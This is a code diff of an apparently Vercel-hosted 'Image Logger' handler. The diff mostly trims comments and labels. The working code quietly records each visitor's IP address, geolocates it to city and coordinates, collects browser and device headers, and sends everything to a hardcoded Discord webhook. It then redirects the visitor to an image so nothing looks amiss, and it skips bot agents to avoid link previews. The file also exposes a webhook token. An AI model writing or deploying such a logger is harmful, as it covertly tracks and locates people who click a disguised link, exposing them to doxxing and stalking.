@@ -5,11 +5,7 @@ const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1522326026577772655/15
 // ─────────────────────────────────────
 
 export default async function handler(req, res) {
-    // ─── Get real IP ───
-    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
-               req.socket.remoteAddress || 
-               null;
-    
+    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || null;
     const ua = req.headers['user-agent'] || null;
     const referer = req.headers['referer'] || null;
     const acceptLang = req.headers['accept-language'] || null;
@@ -20,7 +16,6 @@ export default async function handler(req, res) {
     const dnt = req.headers['dnt'] || null;
     const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
 
-    // ─── IGNORE bots/proxies ───
     const botPatterns = ['Discordbot', 'Twitterbot', 'Slackbot', 'curl', 'python-requests', 'Go-http-client', 'okhttp', 'HTTPie', 'Wget'];
     const isBot = ua && botPatterns.some(bot => ua.includes(bot));
     if (isBot) {
@@ -29,25 +24,18 @@ export default async function handler(req, res) {
         return;
     }
 
-    // ─── Get country from IP ───
     let geo = {};
     if (ip) {
         try {
             const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,timezone,loc,as`);
             if (geoRes.ok) {
                 const data = await geoRes.json();
-                if (data.status === 'success') {
-                    geo = data;
-                }
+                if (data.status === 'success') geo = data;
             }
-        } catch (_) { /* no geo */ }
+        } catch (_) {}
     }
 
-    // ─── Parse User-Agent ───
-    let deviceType = null;
-    let os = null;
-    let browser = null;
-
+    let deviceType = null, os = null, browser = null;
     if (ua) {
         if (ua.includes('Windows')) os = 'Windows';
         else if (ua.includes('Mac OS')) os = 'macOS';
@@ -69,11 +57,8 @@ export default async function handler(req, res) {
         else if (ua.includes('Brave')) browser = 'Brave';
     }
 
-    // ─── Build fields dynamically ───
     const fields = [];
-
-    if (ip) fields.push({ name: '🌐 IP Address', value: `\`${ip}\``, inline: false });
-
+    if (ip) fields.push({ name: '🌐 IP', value: `\`${ip}\``, inline: false });
     if (geo.country) {
         const code = geo.countryCode || 'UN';
         const flag = code.length === 2 ? String.fromCodePoint(...code.toUpperCase().split('').map(ch => 0x1F1E6 + ch.charCodeAt(0) - 65)) : '🌍';
@@ -81,50 +66,40 @@ export default async function handler(req, res) {
     }
     if (geo.regionName) fields.push({ name: '📍 Region', value: geo.regionName, inline: true });
     if (geo.city) fields.push({ name: '🏙️ City', value: geo.city, inline: true });
-    if (geo.loc) fields.push({ name: '🗺️ Location (lat,lon)', value: `\`${geo.loc}\``, inline: false });
+    if (geo.loc) fields.push({ name: '🗺️ Location', value: `\`${geo.loc}\``, inline: false });
     if (geo.timezone) fields.push({ name: '⏰ Timezone', value: geo.timezone, inline: true });
     if (geo.isp) fields.push({ name: '🏢 ISP', value: geo.isp, inline: true });
-    if (geo.org && geo.org !== geo.isp) fields.push({ name: '📋 Organization', value: geo.org, inline: true });
+    if (geo.org && geo.org !== geo.isp) fields.push({ name: '📋 Org', value: geo.org, inline: true });
     if (geo.as) fields.push({ name: '🔢 ASN', value: geo.as, inline: true });
-
     if (deviceType) fields.push({ name: '🖥️ Device', value: deviceType, inline: true });
     if (os) fields.push({ name: '💻 OS', value: os, inline: true });
     if (browser) fields.push({ name: '🌐 Browser', value: browser, inline: true });
     if (secChUaMobile) fields.push({ name: '📱 Mobile', value: secChUaMobile, inline: true });
     if (secChUaPlatform) fields.push({ name: '📋 Platform', value: secChUaPlatform, inline: true });
-
-    if (ua) fields.push({ name: '📎 User-Agent', value: `\`${ua.length > 200 ? ua.slice(0, 200) + '...' : ua}\``, inline: false });
-    if (referer) fields.push({ name: '🔗 Referer', value: referer.length > 100 ? referer.slice(0, 100) + '...' : referer, inline: false });
+    if (ua) fields.push({ name: '📎 User-Agent', value: `\`${ua.length > 150 ? ua.slice(0, 150) + '...' : ua}\``, inline: false });
+    if (referer) fields.push({ name: '🔗 Referer', value: referer.length > 80 ? referer.slice(0, 80) + '...' : referer, inline: false });
     if (acceptLang) fields.push({ name: '🌍 Accept-Language', value: acceptLang, inline: true });
-    if (acceptEncoding) fields.push({ name: '⚙️ Accept-Encoding', value: acceptEncoding, inline: true });
-    if (dnt) fields.push({ name: '🚫 Do Not Track', value: dnt, inline: true });
+    if (acceptEncoding) fields.push({ name: '⚙️ Encoding', value: acceptEncoding, inline: true });
+    if (dnt) fields.push({ name: '🚫 DNT', value: dnt, inline: true });
+    fields.push({ name: '📅 Timestamp', value: `\`${time}\``, inline: false });
 
-    fields.push({ name: '📅 Timestamp (UTC)', value: `\`${time}\``, inline: false });
-
-    // ─── Build embed ───
     const embed = {
-        title: '🕵️ New Click Captured',
+        title: '🕵️ New Click',
         color: 0x00ff88,
-        thumbnail: { url: IMAGE_URL },
         fields: fields,
-        footer: { text: 'Image Logger • Powered by Vercel' }
+        footer: { text: 'Image Logger' }
     };
 
-    // ─── Send to Discord webhook ───
     const webhook = 'https://discord.com/api/webhooks/1532494338477785189/piKPDYGbTysmL3tPK_HQckufpf28oSRKvUAGkt5aHA2EiSyGAMZyOphc464WIJA20Atr';
     const payload = JSON.stringify({ embeds: [embed] });
     const options = {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(payload)
-        }
+        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
     };
     const discordReq = https.request(webhook, options, () => {});
     discordReq.write(payload);
     discordReq.end();
 
-    // ─── REDIRECT to the image ───
     res.writeHead(302, { Location: IMAGE_URL });
     res.end();
 }
